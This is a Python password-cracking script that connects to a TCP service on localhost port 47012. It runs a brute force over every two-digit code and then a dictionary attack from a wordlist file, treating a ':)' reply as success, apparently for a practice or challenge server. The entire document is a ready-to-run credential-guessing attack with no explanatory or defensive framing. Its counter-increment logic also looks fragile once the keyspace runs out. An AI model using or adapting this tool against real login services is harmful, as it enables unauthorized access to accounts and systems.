import socket as sock
import time

address = '127.0.0.1'
port = 47012
wordlist_path = 'wordlist.txt'
formats = {
    'd': '0123456789',
    'a': 'abcdefghijklmnopqrstuvwxyz',
    'A': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    'l': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
    'n': 'abcdefghijklmnopqrstuvwxyz0123456789',
    'N': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
    '?': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
}


def load_wordlist():
    with open(wordlist_path, mode='r') as wordlist_file:
        return str(wordlist_file.read()).splitlines()


def try_password(password):
    socker = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
    socker.connect((address, port))
    print('Received: ' + str(socker.recv(256), encoding='ASCII'))
    print('Sending password: ' + password)
    socker.send(bytes(password + '\n', encoding='ASCII'))
    info = str(socker.recv(256), encoding='ASCII').strip()
    print('Received: ' + info)
    socker.shutdown(sock.SHUT_RDWR)
    socker.close()
    return ':)' in info


def dictionary_attack():
    wordlist = load_wordlist()
    for word in wordlist:
        print('Trying ' + word)
        if try_password(word):
            print('\n')
            print('Found password!')
            print('Password is "' + word + '"')
            return word
        else:
            print('\n')
            time.sleep(0.05)


def inc(format, password, i=0):
    retval = password
    formati = format[i]
    passwordi = password[i]
    if formati in formats:
        retval[i] = (passwordi + 1) % len(formats[formati])
        if retval[i] == 0:
            return inc(format, password, i=i+1)
    else:
        return None
    return retval


def tostr(format, password):
    retval = ''
    for i in range(len(format)):
        formati = format[i]
        passwordi = password[i]
        if formati in formats:
            retval += formats[formati][passwordi % len(formats[formati])]
        else:
            return None
    return retval


def bruteforce(format):
    password = [0] * len(format)
    while 1:
        passw = tostr(format, password)
        print('Trying ' + str(passw))
        if try_password(str(passw)):
            print('\n')
            print('Found password!')
            print('Password is "' + str(passw) + '"')
            return passw
        else:
            password = inc(format, password)
            print('\n')
            time.sleep(0.05)


bruteforce('dd')
dictionary_attack()